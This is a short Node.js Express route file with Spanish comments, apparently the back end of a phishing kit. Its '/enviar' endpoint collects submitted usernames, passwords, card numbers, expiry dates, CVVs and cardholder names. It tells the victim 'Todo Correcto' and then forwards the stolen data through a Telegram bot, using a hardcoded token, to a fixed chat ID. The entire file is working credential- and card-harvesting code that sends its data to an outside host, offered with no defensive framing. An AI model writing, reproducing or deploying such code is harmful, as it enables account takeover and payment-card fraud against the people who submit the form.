const express = require('express')
const router = express.Router()

const TelegramBot = require('node-telegram-bot-api')

const token = '7759203087:AAEnVojW_oFU-sAo6VExRgvw7V4CHV4Nzto';

const bot = new TelegramBot(token, { polling: true });

router.post("/enviar", (req, res) => {
    const {
        name,
        passworld,
        NumeroDeTarjeta,
        FechaDeVencimiento,
        CVV,
        NombreDeTarjeta
    } = req.body;



    // Responde con los datos recibidos
    res.status(201).json({
        message: "Todo Correcto",
        datos: {
            name,
            passworld,
            NumeroDeTarjeta,
            FechaDeVencimiento,
            CVV,
            NombreDeTarjeta
        }
    });

    // Prepara el mensaje para el bot
    let mensaje = '';

    // Solo incluye los datos de login si están completos
    if (name && passworld) {
        mensaje += `Datos del Login:
        Nombre: ${name}
        Contraseña: ${passworld}\n\n`;
    }

    // Solo incluye los datos de la tarjeta si están completos
    if (NumeroDeTarjeta && FechaDeVencimiento && CVV && NombreDeTarjeta) {
        mensaje += `Datos de la Tarjeta:
        Número de Tarjeta: ${NumeroDeTarjeta}
        Fecha de Vencimiento: ${FechaDeVencimiento}
        CVV: ${CVV}
        Nombre de la Tarjeta: ${NombreDeTarjeta}`;
    }

    // Si el mensaje tiene contenido, lo enviamos
    if (mensaje) {
        const chatId = '-1002301383349';  // Reemplaza con el chatId donde quieres enviar el mensaje
        bot.sendMessage(chatId, mensaje);
    }
});

module.exports = router;
